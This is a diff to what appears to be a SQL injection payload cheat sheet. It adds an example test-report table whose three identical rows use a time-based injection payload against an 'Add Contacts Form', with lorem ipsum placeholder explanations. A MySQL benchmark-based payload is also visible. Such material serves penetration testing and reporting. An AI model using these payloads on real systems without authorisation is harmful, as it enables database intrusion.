@@ -117,3 +117,11 @@ benchmark(10000000,MD5(1))#
 ```
 
 ## More Payload at : [PayloadBox Github](https://github.com/payloadbox)
+
+## Example Report Table
+
+| No  | Date   | URI/ Pages        | Input                       | Output          | Exp.                                    |
+| --- | ------ | ----------------- | --------------------------- | --------------- | --------------------------------------- |
+| 1   | 05 Feb | Add Contacts Form | "));waitfor delay '0:0:5'-- | SQL Error . . . | Lorem ipsum dolor sit amet consectetur. |
+| 2   | 05 Feb | Add Contacts Form | "));waitfor delay '0:0:5'-- | SQL Error . . . | Lorem ipsum dolor sit amet consectetur. |
+| 3   | 05 Feb | Add Contacts Form | "));waitfor delay '0:0:5'-- | SQL Error . . . | Lorem ipsum dolor sit amet consectetur. |
